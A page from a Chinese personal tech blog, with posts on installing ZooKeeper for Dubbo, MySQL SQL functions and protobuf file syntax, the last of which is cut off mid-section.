<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="派大星, pibigstar,blog,go">










<meta name="keywords" content="派大星,pibigstar">
<meta property="og:type" content="website">
<meta property="og:title" content="派大星的博客">
<meta property="og:url" content="http://pibigstar.com/page/10/index.html">
<meta property="og:site_name" content="派大星的博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="派大星的博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://pibigstar.com/page/10/">





  <title>派大星的博客 - 很多事情不是会了才能做，而是做了才能学会</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">派大星的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">很多事情不是会了才能做，而是做了才能学会</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/04/01/安装Dubbo的注册中心zookeeper/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/01/安装Dubbo的注册中心zookeeper/" itemprop="url">安装Dubbo的注册中心zookeeper</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T06:06:04+08:00">
                2019-04-01
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Dubbo/" itemprop="url" rel="index">
                    <span itemprop="name">Dubbo</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>安装环境：CentOs、JDK1.6以上</strong></p>
<h2 id="1-下载zookeeper"><a href="#1-下载zookeeper" class="headerlink" title="1. 下载zookeeper"></a>1. 下载zookeeper</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirrors.shu.edu.cn/apache/zookeeper/zookeeper<span class="number">-3.4</span><span class="number">.12</span>/zookeeper<span class="number">-3.4</span><span class="number">.12</span>.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="2-解压"><a href="#2-解压" class="headerlink" title="2. 解压"></a>2. 解压</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf zookeeper<span class="number">-3.4</span><span class="number">.12</span>.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="3-新建data目录"><a href="#3-新建data目录" class="headerlink" title="3. 新建data目录"></a>3. 新建data目录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd zookeeper<span class="number">-3.4</span><span class="number">.12</span></span><br><span class="line"></span><br><span class="line">mkdir data</span><br></pre></td></tr></table></figure>

<h2 id="4-修改配置"><a href="#4-修改配置" class="headerlink" title="4.修改配置"></a>4.修改配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd conf <span class="comment">#进行conf文件夹</span></span><br><span class="line"><span class="comment"># 修改配置文件名字</span></span><br><span class="line">mv zoo_sample.cfg zoo.cfg </span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改zoo.cfg文件, dataDIr = [刚才新建的data文件夹路径]</span></span><br><span class="line">dataDir=/usr/local/zookeeper/zookeeper<span class="number">-3.4</span><span class="number">.12</span>/data</span><br></pre></td></tr></table></figure>

<h2 id="5-启动zookeeper服务"><a href="#5-启动zookeeper服务" class="headerlink" title="5. 启动zookeeper服务"></a>5. 启动zookeeper服务</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd bin <span class="comment">#进入bin目录</span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">./zkServer.sh start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务状态</span></span><br><span class="line">./zkServer.sh status</span><br><span class="line"><span class="comment"># 如果为：Mode: standalone 则证明启动成功</span></span><br></pre></td></tr></table></figure>

<h2 id="6-查看当前注册的结点"><a href="#6-查看当前注册的结点" class="headerlink" title="6. 查看当前注册的结点"></a>6. 查看当前注册的结点</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动zookpeer客户端</span></span><br><span class="line">./zkCli.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180523213106772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2p1bm1veGk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /dubbo</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/2018052321320367?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2p1bm1veGk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>

          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/30/Mysql中的SQL函数/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/30/Mysql中的SQL函数/" itemprop="url">Mysql中的SQL函数</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-30T07:07:04+08:00">
                2019-03-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/数据库/" itemprop="url" rel="index">
                    <span itemprop="name">数据库</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="算术函数"><a href="#算术函数" class="headerlink" title="算术函数"></a>算术函数</h3><ul>
<li>ABS ：取绝对值</li>
<li>MOD：取余</li>
<li>ROUND：四舍五入时指定小数点位数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ABS</span>(<span class="number">-1</span>);  <span class="comment"># 结果为 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MOD</span>(<span class="number">22</span>,<span class="number">5</span>);  <span class="comment"># 22%5 结果为 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ROUND</span>(<span class="number">15.43</span>,<span class="number">1</span>); <span class="comment"># 结果为 15.4</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><ul>
<li>CONCAT： 将多个字符串连接起来</li>
<li>LENGTH： 计算字段的长度，一个汉字算三个字符，字母和数字算一个字符</li>
<li>CHAR_LENGTH：所有都算做一个字符</li>
<li>LOWER：全部转为小写</li>
<li>UPPER：全部转为大写</li>
<li>REPLACE：替换字符</li>
<li>SUBSTRING：截取字符串（字符串, 开始截取位置, 截取长度）<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">"%"</span>,<span class="string">"pibigstar"</span>); <span class="comment"># 结果为 %pibigstar</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LENGTH</span>(<span class="string">"你好"</span>); <span class="comment"># 结果为 6</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">"你好"</span>); <span class="comment"># 结果为 2</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOWER</span>(<span class="string">"AB"</span>); <span class="comment"># 结果为 ab</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="string">"ab"</span>) <span class="comment"># 结果为 AB</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">REPLACE</span>(<span class="string">"abc"</span>,<span class="string">"a"</span>, <span class="string">"f"</span>); <span class="comment"># 结果为 fbc</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUBSTRING</span>(<span class="string">"abc"</span>, <span class="number">1</span>, <span class="number">2</span>); <span class="comment"># 结果为 ab</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><ul>
<li>CURRENT_DATE：系统当前日期</li>
<li>CURRENT_TIME：系统当前时间</li>
<li>CURRENT_TIMESTAMP：系统当前时间（日期+时间）</li>
<li>ECTRACT：抽取具体的年、月、日</li>
<li>DATE：返回时间的日期部分</li>
<li>YEAR：返回时间的年份部分</li>
<li>MONTH：返回时间的月份部分</li>
<li>DAY：返回时间的天数部分</li>
<li>HOUR：返回时间的小时部分</li>
<li>MINUTE：返回时间的分钟部分</li>
<li>SECOND： 返回时间的秒部分<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CURRENT_DATE</span>(); <span class="comment"># 2019-06-29</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CURRENT_TIME</span>(); <span class="comment"># 21:44:33</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CURRENT_TIMESTAMP</span>(); <span class="comment"># 2019-06-29 21:44:33</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">EXTRACT</span>(<span class="keyword">YEAR</span> <span class="keyword">FROM</span> <span class="string">'2019-06-29'</span>); <span class="comment"># 2019</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">DATE</span>(<span class="string">'2019-06-29 21:44:33'</span>); <span class="comment"># 2019-06-29</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DAY</span>(<span class="string">'2019-06-29 21:44:33'</span>);  <span class="comment"># 29</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="转换函数"><a href="#转换函数" class="headerlink" title="转换函数"></a>转换函数</h3><ul>
<li>CAST：强制数据类型转换</li>
<li>COALESCE：返回第一个非空数值<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CAST</span>(<span class="number">65.243</span> <span class="keyword">AS</span> <span class="built_in">DECIMAL</span>(<span class="number">8</span>,<span class="number">2</span>)); <span class="comment"># 65.24</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COALESCE</span>(<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ul>
<li>SUM：求和</li>
<li>AVG：求平均值</li>
<li>MAX：找出最大值</li>
<li>MIN：找出最小值</li>
<li>COUNT：计数<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(age) <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AVG</span>(age) <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(age) <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MIN</span>(age) <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> <span class="keyword">user</span>; <span class="comment"># 计录全部行数，包括null</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(age) <span class="keyword">FROM</span> <span class="keyword">user</span>; <span class="comment"># 如果age为null，将过滤</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> age;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在SELECT的查询中，关键字的顺序不能颠倒，它们的顺序为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT...FROM...WHERE...GROUP BY...HAVING...ORDER BY...LIMIT...</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/30/protobuf文件详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/30/protobuf文件详解/" itemprop="url">protobuf文件详解</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-30T07:07:04+08:00">
                2019-03-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/go-gRPC/" itemprop="url" rel="index">
                    <span itemprop="name">go,gRPC</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h1><ol>
<li><p>一个请求对象对应一个返回对象 </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc Login(LoginRequest) returns (LoginResponse) &#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一个请求对象，服务器返回多个结果</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc Login(LoginRequest) returns (stream LoginResponse) &#123;&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>3.多个请求对象，一个返回结果</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc Login(stream LoginRequest) returns (LoginResponse) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>4.多个请求对象，服务器返回多个结果</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc Login(stream LoginRequest) returns (stream LoginResponse) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>关键字 <code>stream</code> 表示多个值</p>
<h1 id="Protobuf定义"><a href="#Protobuf定义" class="headerlink" title="Protobuf定义"></a>Protobuf定义</h1><ul>
<li><p><strong>syntax=”proto3”;</strong></p>
<blockquote>
<p>文件的第一行指定了你使用的是proto3的语法：如果你不指定，protocol buffer 编译器就会认为你使用的是proto2的语法。这个语句必须出现在.proto文件的非空非注释的第一行。 </p>
</blockquote>
</li>
<li><p><strong>package user;</strong></p>
<blockquote>
<p>编译完成之后，包名为user</p>
</blockquote>
</li>
<li><p><strong>service 定义服务</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service UserService &#123;</span><br><span class="line">  rpc Login(LoginRequest) returns (LoginResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>message 定义结构体</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message LoginRequest &#123;</span><br><span class="line">	<span class="keyword">string</span> username=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">string</span> password=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
<li><p>strings 默认值是空字符串</p>
</li>
<li><p>int32 默认是0（编译之后为go语言中的int类型）</p>
</li>
<li><p>int64 默认是0 （编译之后为go语言中的int64）</p>
</li>
<li><p>float 默认为0.0 （编译之后为go语言中的 float32）</p>
</li>
<li><p>double 默认为0.0 （编译之后为go语言中的 float64）</p>
</li>
<li><p>uint32 （编译之后为go语言中的 uint32）</p>
</li>
<li><p>uint64 （编译之后为go语言中的 uint64）</p>
</li>
<li><p>bytes 默认值是空bytes</p>
</li>
<li><p>bool 默认值是false </p>
</li>
<li><p>enum 默认值是第一个枚举值（value必须为0)</p>
<h2 id="字段修饰符"><a href="#字段修饰符" class="headerlink" title="字段修饰符"></a>字段修饰符</h2></li>
<li><p><code>repeated</code>：用来定义数组，一个字段可以重复出现一定次数（包括零次）</p>
</li>
<li><p><code>required</code>：值不可为空 (proto3中已删除)</p>
</li>
<li><p><code>optional</code>：可选字段 (proto3中已删除)</p>
</li>
<li><p><code>singular</code>：符合语法规则的消息包含零个或者一个这样的字段 (proto3中已删除)</p>
</li>
<li><p>默认值： <code>string code=2 [default=200];</code> (proto3中已删除)</p>
<h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2></li>
</ul>
<ol>
<li>枚举定义</li>
</ol>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//枚举类型，必须从0开始，序号可跨越。同一包下不能重名，所以加前缀来区别</span></span><br><span class="line">enum Role &#123;</span><br><span class="line">	Role_Admin=<span class="number">0</span>;</span><br><span class="line">	Role_Guest=<span class="number">1</span>;</span><br><span class="line">	Role_User=<span class="number">2</span>;</span><br><span class="line">	Role_Other=<span class="number">9</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Map类型<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">map</span>&lt;key_type, value_type&gt; map_field = N;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<blockquote>
<p>其中key_type可以是任意Integer或者string类型（所以，除了floating和bytes的任意标量类型都是可以的）value_type可以是任意类型。 </p>
</blockquote>
<p>例如，如果你希望创建一个project的映射，每个Projecct使用一个string作为key</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">map</span>&lt;<span class="keyword">string</span>, Project&gt; projects = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">syntax=<span class="string">"proto3"</span>;</span><br><span class="line"><span class="keyword">package</span> user;</span><br><span class="line"></span><br><span class="line">service UserService&#123;</span><br><span class="line">	<span class="comment">// 注册</span></span><br><span class="line">	rpc Signup(SignupRequest) returns (SignupResponse);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义错误枚举，必须从0开始</span></span><br><span class="line">enum LoginError &#123;</span><br><span class="line">	<span class="comment">//密码错误</span></span><br><span class="line">	Error_Password=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//用户名错误</span></span><br><span class="line">	Error_UserName=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">//内部服务器错误</span></span><br><span class="line">	Error_Server=<span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line">message ID &#123;</span><br><span class="line">	<span class="keyword">int32</span> id=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册请求体</span></span><br><span class="line">message SignupRequest &#123;</span><br><span class="line">	<span class="keyword">string</span> username=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">string</span> password=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int32</span> code=<span class="number">3</span>;</span><br><span class="line">	<span class="comment">// 数组</span></span><br><span class="line">	repeated <span class="keyword">string</span> hobby=<span class="number">4</span>;</span><br><span class="line">	<span class="comment">// map</span></span><br><span class="line">	<span class="keyword">map</span>&lt;<span class="keyword">string</span>,<span class="keyword">string</span>&gt; maps = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册响应体</span></span><br><span class="line">message SignupResponse &#123;</span><br><span class="line">	ID id=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int32</span> code=<span class="number">2</span> [<span class="keyword">default</span>=<span class="number">200</span>];</span><br><span class="line">	<span class="keyword">string</span> msg=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Google中提供的特殊类型"><a href="#Google中提供的特殊类型" class="headerlink" title="Google中提供的特殊类型"></a>Google中提供的特殊类型</h1><p>待定。。。</p>
<h1 id="数据校验"><a href="#数据校验" class="headerlink" title="数据校验"></a>数据校验</h1><p>插件地址及文档：<a href="https://github.com/envoyproxy/protoc-gen-validate" target="_blank" rel="noopener">https://github.com/envoyproxy/protoc-gen-validate</a></p>
<h1 id="流的使用"><a href="#流的使用" class="headerlink" title="流的使用"></a>流的使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc GetStatus (GetReq) return (stream GetResp);</span><br></pre></td></tr></table></figure>

<p>service实现</p>
